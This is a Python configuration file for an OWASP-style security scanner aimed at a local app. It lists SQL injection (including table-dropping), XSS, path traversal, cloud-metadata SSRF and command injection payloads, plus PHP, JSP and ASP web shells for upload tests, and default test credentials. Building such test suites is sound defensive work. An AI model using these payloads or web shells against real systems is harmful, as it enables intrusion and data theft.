"""
Security Testing Configuration

Configuration settings for OWASP-based security testing framework.
Includes test targets, authentication settings, and vulnerability patterns.
"""

import os
from typing import Dict, List, Optional
from dataclasses import dataclass
from pathlib import Path

@dataclass
class SecurityTestConfig:
    """Configuration for security testing framework."""
    
    # Test target configuration
    base_url: str = "http://localhost:8181"
    api_base_url: str = "http://localhost:8181/api"
    frontend_url: str = "http://localhost:3737"
    
    # Authentication configuration
    admin_username: str = "admin"
    admin_password: str = "admin123"
    test_username: str = "testuser"
    test_password: str = "testpass123"
    
    # Test execution settings
    max_concurrent_tests: int = 5
    request_timeout: int = 30
    retry_attempts: int = 3
    rate_limit_delay: float = 0.1  # seconds between requests
    
    # Vulnerability scanning configuration
    enable_sql_injection: bool = True
    enable_xss_testing: bool = True
    enable_csrf_testing: bool = True
    enable_ssrf_testing: bool = True
    enable_auth_testing: bool = True
    enable_file_upload_testing: bool = True
    enable_path_traversal: bool = True
    enable_input_validation: bool = True
    
    # Test reporting configuration
    output_directory: str = "security_test_results"
    report_format: str = "json"  # json, html, xml
    include_raw_responses: bool = False
    severity_threshold: str = "medium"  # low, medium, high, critical
    
    # Advanced testing options
    deep_scan: bool = False
    custom_headers: Dict[str, str] = None
    proxy_url: Optional[str] = None
    user_agent: str = "Archon-Security-Scanner/1.0"
    
    def __post_init__(self):
        """Initialize derived configurations."""
        if self.custom_headers is None:
            self.custom_headers = {}
        
        # Ensure output directory exists
        Path(self.output_directory).mkdir(exist_ok=True)
    
    @classmethod
    def from_env(cls) -> 'SecurityTestConfig':
        """Create configuration from environment variables."""
        return cls(
            base_url=os.getenv("SECURITY_TEST_BASE_URL", "http://localhost:8181"),
            api_base_url=os.getenv("SECURITY_TEST_API_URL", "http://localhost:8181/api"),
            frontend_url=os.getenv("SECURITY_TEST_FRONTEND_URL", "http://localhost:3737"),
            admin_username=os.getenv("SECURITY_TEST_ADMIN_USER", "admin"),
            admin_password=os.getenv("SECURITY_TEST_ADMIN_PASS", "admin123"),
            test_username=os.getenv("SECURITY_TEST_USER", "testuser"),
            test_password=os.getenv("SECURITY_TEST_PASS", "testpass123"),
            max_concurrent_tests=int(os.getenv("SECURITY_TEST_CONCURRENCY", "5")),
            request_timeout=int(os.getenv("SECURITY_TEST_TIMEOUT", "30")),
            deep_scan=os.getenv("SECURITY_TEST_DEEP_SCAN", "false").lower() == "true",
            output_directory=os.getenv("SECURITY_TEST_OUTPUT", "security_test_results"),
            proxy_url=os.getenv("SECURITY_TEST_PROXY", None),
        )

# Test endpoint configurations
SECURITY_TEST_ENDPOINTS = {
    "authentication": [
        "/api/auth/login",
        "/api/auth/logout",
        "/api/auth/register",
        "/api/auth/refresh",
    ],
    "knowledge": [
        "/api/knowledge",
        "/api/knowledge/search",
        "/api/knowledge/upload",
        "/api/knowledge/crawl",
        "/api/knowledge/items",
    ],
    "projects": [
        "/api/projects",
        "/api/projects/{id}",
        "/api/projects/{id}/tasks",
        "/api/projects/{id}/documents",
    ],
    "mcp": [
        "/api/mcp/health",
        "/api/mcp/tools",
        "/api/mcp/tools/{tool_name}",
    ],
    "settings": [
        "/api/settings",
        "/api/settings/credentials",
    ],
    "internal": [
        "/api/internal/health",
        "/api/internal/metrics",
    ]
}

# SQL injection test payloads
SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "'; DROP TABLE users; --",
    "' UNION SELECT null, null, null --",
    "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
    "admin'--",
    "admin' #",
    "admin'/*",
    "' or 1=1#",
    "' or 1=1--",
    "' or 1=1/*",
    "') or '1'='1--",
    "') or ('1'='1--",
    "1' ORDER BY 1--+",
    "1' ORDER BY 2--+",
    "1' ORDER BY 3--+",
    "1' UNION SELECT null--+",
    "1' UNION SELECT null,null--+",
    "1' UNION SELECT null,null,null--+",
]

# XSS test payloads
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<iframe src=javascript:alert('XSS')></iframe>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<keygen onfocus=alert('XSS') autofocus>",
    "<video><source onerror=alert('XSS')>",
    "<audio src=x onerror=alert('XSS')>",
    "<details open ontoggle=alert('XSS')>",
    "<marquee onstart=alert('XSS')>",
    "'\"><script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",
    "</script><script>alert('XSS')</script>",
    "<ScRiPt>alert('XSS')</ScRiPt>",
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
]

# Path traversal payloads
PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",
    "....//....//....//etc/passwd",
    "....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
    "/etc/passwd",
    "\\windows\\system32\\drivers\\etc\\hosts",
    "file:///etc/passwd",
    "file://c:/windows/system32/drivers/etc/hosts",
]

# SSRF test URLs
SSRF_TEST_URLS = [
    "http://localhost:8080",
    "http://127.0.0.1:8080",
    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
    "http://metadata.google.internal/computeMetadata/v1/",  # GCP metadata
    "http://100.100.100.200/latest/meta-data/",  # Alibaba Cloud metadata
    "http://0.0.0.0:8080",
    "http://[::]::8080",
    "file:///etc/passwd",
    "ftp://localhost:21",
    "gopher://localhost:8080",
    "ldap://localhost:389",
]

# Command injection payloads
COMMAND_INJECTION_PAYLOADS = [
    "; ls -la",
    "| ls -la",
    "&& ls -la",
    "|| ls -la",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "&& cat /etc/passwd",
    "|| cat /etc/passwd",
    "; whoami",
    "| whoami",
    "&& whoami",
    "|| whoami",
    "`ls -la`",
    "$(ls -la)",
    "${IFS}ls${IFS}-la",
    "test; echo vulnerable",
    "test | echo vulnerable",
    "test && echo vulnerable",
    "test || echo vulnerable",
]

# File upload malicious payloads
MALICIOUS_FILE_PAYLOADS = {
    "php_webshell": {
        "filename": "shell.php",
        "content": "<?php system($_GET['cmd']); ?>",
        "content_type": "application/x-php"
    },
    "jsp_webshell": {
        "filename": "shell.jsp",
        "content": "<%@ page import=\"java.io.*\" %><% String cmd = request.getParameter(\"cmd\"); Process p = Runtime.getRuntime().exec(cmd); %>",
        "content_type": "application/x-jsp"
    },
    "asp_webshell": {
        "filename": "shell.asp",
        "content": "<%eval request(\"cmd\")%>",
        "content_type": "application/x-asp"
    },
    "html_xss": {
        "filename": "xss.html",
        "content": "<script>alert('XSS')</script>",
        "content_type": "text/html"
    },
    "svg_xss": {
        "filename": "xss.svg",
        "content": "<svg onload=alert('XSS')></svg>",
        "content_type": "image/svg+xml"
    },
    "pdf_malformed": {
        "filename": "malformed.pdf",
        "content": "%PDF-1.4\n<script>alert('XSS')</script>",
        "content_type": "application/pdf"
    },
    "double_extension": {
        "filename": "image.jpg.php",
        "content": "<?php system($_GET['cmd']); ?>",
        "content_type": "image/jpeg"
    },
    "null_byte": {
        "filename": "image.jpg\x00.php",
        "content": "<?php system($_GET['cmd']); ?>",
        "content_type": "image/jpeg"
    },
    "large_file": {
        "filename": "large.txt",
        "content": "A" * (100 * 1024 * 1024),  # 100MB
        "content_type": "text/plain"
    }
}

# HTTP headers for security testing
SECURITY_TEST_HEADERS = {
    "default": {
        "User-Agent": "Archon-Security-Scanner/1.0",
        "Accept": "application/json",
        "Content-Type": "application/json",
    },
    "injection_test": {
        "User-Agent": "' OR '1'='1' --",
        "X-Forwarded-For": "' OR '1'='1' --",
        "X-Real-IP": "127.0.0.1'; DROP TABLE users; --",
        "Referer": "<script>alert('XSS')</script>",
    },
    "header_injection": {
        "X-Custom-Header": "test\r\nInjected-Header: malicious",
        "Authorization": "Bearer \r\nX-Injected: malicious",
    },
    "long_headers": {
        "X-Long-Header": "A" * 8192,
        "User-Agent": "A" * 4096,
    }
}

# Expected security headers in responses
EXPECTED_SECURITY_HEADERS = {
    "X-Content-Type-Options": "nosniff",
    "X-Frame-Options": "DENY",
    "X-XSS-Protection": "1; mode=block",
    "Strict-Transport-Security": "max-age=31536000; includeSubDomains; preload",
    "Content-Security-Policy": lambda x: "default-src" in x,
    "Referrer-Policy": "strict-origin-when-cross-origin",
    "Permissions-Policy": lambda x: "geolocation=" in x,
}

# OWASP Top 10 2021 mapping
OWASP_TOP_10_MAPPING = {
    "A01": {
        "name": "Broken Access Control",
        "tests": ["authorization_bypass", "privilege_escalation", "insecure_direct_object_references"]
    },
    "A02": {
        "name": "Cryptographic Failures",
        "tests": ["weak_encryption", "insecure_transmission", "weak_random_generation"]
    },
    "A03": {
        "name": "Injection",
        "tests": ["sql_injection", "nosql_injection", "command_injection", "ldap_injection"]
    },
    "A04": {
        "name": "Insecure Design",
        "tests": ["business_logic_flaws", "architecture_security_flaws"]
    },
    "A05": {
        "name": "Security Misconfiguration",
        "tests": ["default_credentials", "unnecessary_features", "error_handling", "security_headers"]
    },
    "A06": {
        "name": "Vulnerable and Outdated Components",
        "tests": ["dependency_check", "version_disclosure", "known_vulnerabilities"]
    },
    "A07": {
        "name": "Identification and Authentication Failures",
        "tests": ["weak_passwords", "session_management", "authentication_bypass"]
    },
    "A08": {
        "name": "Software and Data Integrity Failures",
        "tests": ["insecure_deserialization", "supply_chain_attacks", "integrity_verification"]
    },
    "A09": {
        "name": "Security Logging and Monitoring Failures",
        "tests": ["insufficient_logging", "log_tampering", "monitoring_failures"]
    },
    "A10": {
        "name": "Server-Side Request Forgery",
        "tests": ["ssrf_internal", "ssrf_external", "ssrf_cloud_metadata"]
    }
}

# Severity levels for vulnerability classification
SEVERITY_LEVELS = {
    "CRITICAL": {
        "score": 9.0,
        "color": "red",
        "description": "Immediate action required - exploitable vulnerability with high impact"
    },
    "HIGH": {
        "score": 7.0,
        "color": "orange", 
        "description": "High priority - significant security risk requiring prompt attention"
    },
    "MEDIUM": {
        "score": 5.0,
        "color": "yellow",
        "description": "Medium priority - moderate security risk requiring attention"
    },
    "LOW": {
        "score": 3.0,
        "color": "blue",
        "description": "Low priority - minor security concern for future improvement"
    },
    "INFO": {
        "score": 1.0,
        "color": "green",
        "description": "Informational - security enhancement opportunity"
    }
}